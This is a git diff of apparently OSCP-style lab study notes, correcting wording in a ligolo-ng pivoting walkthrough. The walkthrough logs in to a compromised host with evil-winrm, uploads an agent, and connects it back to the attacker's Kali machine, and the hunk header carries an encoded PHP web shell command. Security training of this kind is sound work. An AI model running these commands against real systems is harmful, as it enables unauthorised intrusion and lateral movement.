@@ -1051,27 +1051,27 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
    DC01 (172.0.x.x)   MS02 (172.0.x.x)
   ```
 - 🖥️ **Ligolo-ng setup and install**
-  1. Install ligolo-ng to include ligolo-ng proxi file  
+  1. Install ligolo-ng to include ligolo-ng proxy file  
      `sudo apt install ligolo-ng`
   3. Download the agent files from the GitHub for the target machine (In OCSP is windows)  
      - https://github.com/nicocha30/ligolo-ng/releases
      - [ligolo-ng_agent_0.8.1_windows_amd64.zip](https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.1/ligolo-ng_agent_0.8.1_windows_amd64.zip)
      - After extracted, 3 files:agent.exe, License, readme.md
-  5. Connect to compromised server (agent) - **MS01**  
+  5. Connect to compromised server (agent) - MS01
      `evil-winrm -i <TARGET_IP> -u <USERNAME> -p '<PASSWORD>'`
-  6. Transfer the agent.exe to compromised agent - MS01  
-     `upload /home/kali/offsec/ligolo/agent.exe C:/Users/eric.wallows/Documents/agent.exe`  
+  6. Transfer the agent.exe to compromised agent - **MS01**  
+     `*Evil-WinRM* PS C:\Users\eric.wallows\Documents> upload /home/kali/offsec/ligolo/agent.exe C:/Users/eric.wallows/Documents/agent.exe`  
   8. Setup proxy in **kali** > Create a new TUN interface ligolo and bring it up    
      ```
      sudo ip tuntap add user <Your Username-kali> mode tun ligolo
      sudo ip link set ligolo up
      ```
-  9. Start the ligolo-proxy with selfcert option  
+  9. Start the ligolo-proxy with selfcert option from **kali**
      `ligolo-proxy -selfcert`
   10. Start the agent in compromised server (agent) - **MS01**  
-      `.\agent.exe -connect <kali>:11601 -ignore-cert`
-  11. Agent joined. Back to ligolo terminal  
-  12. Set up tunnel and configure the route to establish a connection  
+      `*Evil-WinRM* PS C:\Users\eric.wallows\Documents>.\agent.exe -connect <kali>:11601 -ignore-cert`  
+  12. Agent joined. Back to **ligolo** terminal  
+  13. Set up tunnel and configure the route to establish a connection  
       ```
       ligolo-ng » session
       
